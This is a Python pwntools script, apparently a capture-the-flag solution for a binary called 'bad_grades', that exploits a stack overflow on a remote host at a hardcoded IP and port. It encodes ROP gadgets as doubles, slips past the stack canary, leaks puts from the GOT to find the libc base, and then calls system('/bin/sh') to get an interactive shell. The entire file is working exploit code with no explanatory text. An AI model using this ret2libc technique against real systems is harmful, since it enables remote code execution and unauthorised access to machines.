from pwn import *
import binascii
import struct
pop_rdi       = 0x0000000000401263 
ret           = 0x0000000000400666
puts_plt      = 0x00400680
puts_got      = 0x00601fa8
vuln_func     = 0x00400fd5
shell_offset  = 0x1b3e1a
system_offset = 0x000000000004f550

def hex_to_double(hex_string):
    hex_string = p64(hex_string).hex() 
    return str(struct.unpack('d', binascii.unhexlify(hex_string))).strip('(),') 
def main():
    context.arch = 'amd64'

    elf = ELF("./bad_grades")
    libc = ELF("./libc.so.6")

    target = remote("94.237.51.112", 53523)
    target.sendlineafter(b"> ", b"2")
    target.sendlineafter(b"Number of grades: ", b"43")

    for i in range(35):
        target.sendline(".")

    target.sendline(hex_to_double(pop_rdi))
    target.sendline(hex_to_double(next(elf.search(b""))))
    target.sendline(hex_to_double(puts_plt)) 

    target.sendline(hex_to_double(pop_rdi))
    target.sendline(hex_to_double(puts_got))
    target.sendline(hex_to_double(puts_plt))
    
    target.sendline(hex_to_double(ret))
    target.sendline(hex_to_double(vuln_func))
    
    target.recvline()
    target.recvline()

    leak = u64(target.recvline().strip().ljust(8, b'\x00'))
    server_libc_base_addr = leak - libc.symbols['puts']
    log.info(f"Server libc base address: {server_libc_base_addr}")
    libc.address = server_libc_base_addr

    target.sendlineafter(b"Number of grades: ", b"39")

    for i in range(35):
        target.sendline(".")
    target.sendline(hex_to_double(ret))
    target.sendline(hex_to_double(pop_rdi))
    target.sendline(hex_to_double(server_libc_base_addr + shell_offset))
    target.sendline(hex_to_double(server_libc_base_addr + system_offset)) 
    
    target.interactive()

if __name__=='__main__':
    main()
          
